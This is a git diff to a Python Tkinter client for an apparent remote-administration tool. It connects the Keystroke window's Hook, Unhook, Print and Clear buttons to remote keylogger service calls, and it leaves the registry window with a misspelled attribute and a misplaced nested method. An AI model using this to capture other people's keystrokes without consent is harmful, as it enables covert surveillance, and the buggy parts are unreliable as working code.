@@ -94,23 +94,23 @@ class ClientGUI:
             showerror(title = 'Error', message = 'Not connected to the server.')
             return        
         window_runningApp = Toplevel()
-        runningAppGUI(window_runningApp, self.buff)
+        runningAppGUI(window_runningApp, self.services)
         window_runningApp.mainloop()
 
     def keystroke(self):
-        if self.buff == None:
+        if self.services == None:
             showerror(title = 'Error', message = 'Not connected to the server.')
             return        
         window_keystroke = Toplevel()
-        keystrokeGUI(window_keystroke, self.buff)
+        keystrokeGUI(window_keystroke, self.services)
         window_keystroke.mainloop()
 
     def editRegistry(self):
-        if self.buff == None:
+        if self.services == None:
             showerror(title = 'Error', message = 'Not connected to the server.')
             return        
         window_editRegistry = Toplevel()
-        editRegistryGUI(window_editRegistry, self.buff)
+        editRegistryGUI(window_editRegistry, self.services)
         window_editRegistry.mainloop()
     def shutdown(self):
         showinfo(title='Shutdown', message='Shutdown request sent.')
@@ -295,8 +295,8 @@ class startProcessGUI:
             showerror("Error", "Unable to start this process")
 
 class runningAppGUI:
-    def __init__(self, master, buff):
-        self.buff = buff
+    def __init__(self, master, services):
+        self.services = services
         self.master = master
         self.master.title("Running app")
         # self.master.geometry('300x200')
@@ -417,8 +417,8 @@ class startAppGUI:
         pass
 
 class keystrokeGUI:
-    def __init__(self, master, buff):
-        self.buff = buff
+    def __init__(self, master, services):
+        self.services = services
         self.master = master
         self.master.title("Keystroke")
         # self.master.geometry('300x200')
@@ -427,34 +427,59 @@ class keystrokeGUI:
         self.master['padx'] = 10
         self.master['pady'] = 10
 
-        self.btn_kill = Button(self.master, text = "Hook", width = 10, command = self.hook)
-        self.btn_kill.grid(column = 0, row = 0, sticky = tk.N, padx = 5, pady = 5, ipady = 10)
+        self.btn_hook = Button(self.master, text = "Hook", width = 10, command = self.hook)
+        self.btn_hook.grid(column = 0, row = 0, sticky = tk.N, padx = 5, pady = 5, ipady = 10)
 
-        self.btn_show = Button(self.master, text = "Unhook", width = 10, command = self.unhook)
-        self.btn_show.grid(column = 1, row = 0, sticky = tk.N, padx = 5, pady = 5, ipady = 10)
+        self.btn_unhook = Button(self.master, text = "Unhook", width = 10, command = self.unhook)
+        self.btn_unhook.grid(column = 1, row = 0, sticky = tk.N, padx = 5, pady = 5, ipady = 10)
+        self.btn_unhook.config(state = 'disabled')
 
-        self.btn_hide = Button(self.master, text = "Print", width = 10, command = self.print)
-        self.btn_hide.grid(column = 2, row = 0, sticky = tk.N, padx = 5, pady = 5, ipady = 10)
+        self.btn_print = Button(self.master, text = "Print", width = 10, command = self.print)
+        self.btn_print.grid(column = 2, row = 0, sticky = tk.N, padx = 5, pady = 5, ipady = 10)
 
-        self.btn_start = Button(self.master, text = "Clear", width = 10, command = self.clear)
-        self.btn_start.grid(column = 3, row = 0, sticky = tk.N, padx = 5, pady = 5, ipady = 10)
+        self.btn_clear = Button(self.master, text = "Clear", width = 10, command = self.clear)
+        self.btn_clear.grid(column = 3, row = 0, sticky = tk.N, padx = 5, pady = 5, ipady = 10)
 
         self.text_area = scrolledtext.ScrolledText(self.master, wrap = tk.WORD, width = 41, height = 10)
         self.text_area.grid(column = 0, row = 1, columnspan = 4, pady = 10)
         self.text_area['state'] = 'disabled'
 
+        self.master.protocol("WM_DELETE_WINDOW", self.exit)
+        self.services.keylogger_Start()
+
     def hook(self):
-        pass
+        self.services.keylogger_Command('hook')
+
+        self.btn_hook.config(state = 'disabled')
+        self.btn_unhook.config(state = 'normal')
+
     def unhook(self):
-        pass
+        self.services.keylogger_Command('unhook')
+
+        self.btn_hook.config(state = 'normal')
+        self.btn_unhook.config(state = 'disabled')
+
     def print(self):
-        pass
+        self.text_area.config(state = 'normal')
+        self.text_area.delete(1.0, END)
+        self.text_area.insert(INSERT, self.services.keylogger_Send())
+        self.text_area.config(state = 'disabled')
+
     def clear(self):
-        pass
+        self.services.keylogger_Command('clear')
+
+        self.text_area.config(state = 'normal')
+        self.text_area.delete(1.0, END)
+        self.text_area.config(state = 'disabled')
+    
+    def exit(self):
+        self.services.keylogger_Command('exit')
+        self.master.destroy()
+
 
 class editRegistryGUI:
-    def __init__(self, master, buff):
-        self.buff = buff
+    def __init__(self, master, services):
+        self.service = services
         self.master = master
         self.master.title("Edit registry")
         # self.master.geometry('400x200')
@@ -551,6 +576,11 @@ class editRegistryGUI:
         self.button1.grid(row=4, column=0, pady = 5)
         self.button2 = ttk.Button(self.frame_editDirectly, text="Delete")
         self.button2.grid(row=4, column=2, pady = 5)
+
+        def clearLog(self):
+            self.text_area.config(state = 'normal')
+            self.text_area.delete(1.0, END)
+            self.text_area.config(state = 'disabled')
 
 window_client = Tk()
 a = ClientGUI(window_client)
